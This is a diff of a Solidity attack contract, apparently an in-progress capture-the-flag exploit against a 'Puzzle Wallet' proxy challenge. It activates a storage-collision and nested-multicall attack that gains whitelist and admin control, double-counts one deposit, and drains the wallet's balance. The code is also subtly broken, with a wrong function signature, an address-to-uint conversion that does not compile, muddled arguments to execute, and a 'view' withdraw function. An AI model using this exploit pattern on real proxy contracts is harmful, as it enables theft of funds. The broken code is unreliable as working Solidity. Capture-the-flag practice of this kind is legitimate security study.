@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "./24-puzzlewallet.sol";
+import "./24-puzzletarget.sol";//       <-- WTF! 
 
 contract Attack24 {
     PuzzleWallet public target;
@@ -19,12 +19,9 @@ contract Attack24 {
     function attack() public {
         proxy.proposeNewAdmin(address(this));
         target.addToWhitelist(address(this));
-        emit AddedToWhiteList(address(this));
 
-        // build deposit and multicall   <--  HERE
+        // build deposit and multicall   <--  HERE hare (or in other words the github code)
 
-    /*
-        
         bytes memory deposit_sig = abi.encodeWithSignature("deposit()");
         
         bytes[] memory deposit_sig_in_array = new bytes[](1);
@@ -36,20 +33,18 @@ contract Attack24 {
             deposit_sig_in_array
         );
         
-        // bytes[] memory data = [deposit_sig, multicall_sig];
         bytes[] memory data = new bytes[](2);
         data[0] = deposit_sig;
         data[1] = multicall_sig;
-        wallet.multicall{value: address(this).balance}(data);
+        target.multicall{value: address(this).balance}(data);
         bytes memory transfer_sig = abi.encodeWithSignature(
             "transfer(int)",
-            address(wallet).balance
+            address(target).balance
         );
 
-    */
+        target.execute(msg.sender, address(target).balance, transfer_sig);
+        target.setMaxBalance(uint256(msg.sender));
 
-        // target.execute();
-        // target.setMaxBalance(); 
      }
 
     function withdraw() public view {
@@ -57,11 +52,6 @@ contract Attack24 {
         // withdraw all funds using a call()
     }
 }
-
-
-// function encodeCall(address -to, uint256 _amount) external pure returns (bytes memory) {
-//     return abi.encodeCall(IERC20.transfer, (to, amount));
-// }
 
 
 
